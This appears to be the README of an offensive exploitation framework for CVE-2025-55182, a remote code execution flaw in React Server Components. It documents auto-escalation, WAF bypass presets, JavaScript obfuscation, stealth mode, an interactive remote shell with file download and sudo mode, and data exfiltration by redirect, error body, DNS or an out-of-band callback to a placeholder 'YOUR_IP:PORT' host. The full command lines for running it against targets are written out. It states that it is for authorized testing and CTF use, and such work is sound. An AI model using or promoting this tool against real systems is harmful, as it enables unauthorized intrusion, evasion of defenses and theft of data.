# React2Shell Advanced

Advanced exploitation framework for **CVE-2025-55182** — a critical Remote Code Execution vulnerability in React Server Components (RSC) via insecure deserialization in the Flight protocol.

> ⚠️ **For authorized security testing and CTF challenges only.**

## Features

- **Dual Payload Strategies** — Two structurally different exploit payloads (Strategy A: circulating 3-part, Strategy B: lachlan2k original 5-part)
- **WAF Bypass Engine** — 6 bypass presets with Unicode JSON escaping, multipart tricks, header rotation, boundary obfuscation, and charset manipulation
- **Multi-Channel Exfiltration** — Redirect header, error body, OOB callback, DNS exfil
- **Auto-Escalation** — Automatically tries 30 combinations of strategy × bypass × exfil to find a working config
- **Safe Probe** — Non-RCE vulnerability detection without executing code
- **Auto Domain Resolution** — Resolves domain from IP via reverse DNS (WAFs often block IP-based requests)
- **OS Detection** — Automatically detects Windows vs Linux targets
- **Interactive Shell** — Readline-powered shell with command history, file download, and system enumeration

## Installation

```bash
# Only dependency
pip install requests
```

## Quick Start

```bash
# Interactive shell
python3 react2shell_advanced.py -u https://target.com

# Safe vulnerability check (no RCE)
python3 react2shell_advanced.py -u https://target.com --safeprobe

# Full auto-escalation
python3 react2shell_advanced.py -u https://target.com --auto-pwn

# Single command
python3 react2shell_advanced.py -u https://target.com -c "whoami"

# With custom Host header (when target is behind reverse proxy)
python3 react2shell_advanced.py -u http://1.2.3.4:3000 -H target.com

# With WAF bypass + obfuscation
python3 react2shell_advanced.py -u https://target.com -j 2 -o 3 --bypass medium

# OOB callback exfiltration
python3 react2shell_advanced.py -u https://target.com --exfil callback --callback-url http://YOUR_IP:PORT
```

## Shell Commands

| Command | Description |
|---------|-------------|
| `.safeprobe` | Non-RCE vulnerability check |
| `.auto [cmd]` | Auto-escalate through all 30 combos |
| `.rawtest [cmd]` | Send one exploit and show raw response |
| `.strategy A\|B` | Switch payload variant |
| `.exfil [channel]` | Switch exfiltration (`redirect`, `error`, `callback`, `dns`) |
| `.bypass [preset]` | WAF bypass (`none`, `light`, `medium`, `generic`, `heavy`, `aggressive`) |
| `.obf N` | JS obfuscation level (0-4) |
| `.jsonesc N` | Unicode JSON escaping level (0-2) |
| `.host domain` | Set custom Host header |
| `.info` | System enumeration |
| `.download path` | Download file from target |
| `.root` | Toggle sudo mode (Linux) |
| `.debug` | Toggle debug output |

## How It Works

CVE-2025-55182 exploits insecure deserialization in React's Flight protocol. The framework crafts multipart POST requests that trigger prototype pollution, reaching the JavaScript `Function` constructor to achieve RCE.

```
POST /target → Multipart Payload → Flight Deserialization → Prototype Pollution → Function() → RCE
                                                                                        ↓
                                                                        execSync(cmd) → Output via redirect/error/callback
```

## CLI Options

```
-u, --url           Target URL (required)
-c, --command       Execute single command
-H, --host          Custom Host header
--strategy A|B      Payload variant (A=3-part, B=5-part)
--bypass PRESET     WAF bypass preset
--exfil CHANNEL     Exfiltration method
-o, --obfuscate N   JS obfuscation level (0-4)
-j, --json-escape N Unicode JSON escaping (0-2)
--stealth           Stealth mode (random UA, delays, browser headers)
--callback-url URL  Callback URL for OOB exfil
--dns-domain DOM    Domain for DNS exfil
--proxy URL         HTTP proxy
--timeout N         Request timeout (default: 90s)
--debug             Debug output
--auto-pwn          Full auto-escalation mode
--safeprobe         Non-RCE vulnerability check only
```

## Disclaimer

This tool is intended for **authorized penetration testing** and **CTF competitions** only. Unauthorized access to computer systems is illegal. The authors are not responsible for misuse.
